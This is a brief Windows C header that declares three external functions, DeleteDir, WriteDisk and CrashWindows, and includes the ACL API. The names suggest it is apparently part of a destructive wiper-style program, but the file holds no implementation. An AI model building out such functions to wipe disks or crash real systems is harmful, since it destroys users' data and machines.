#pragma once

#include <Windows.h>
#include <AclAPI.h>

extern void DeleteDir(PWSTR szDirectory);
extern void WriteDisk();
extern void CrashWindows();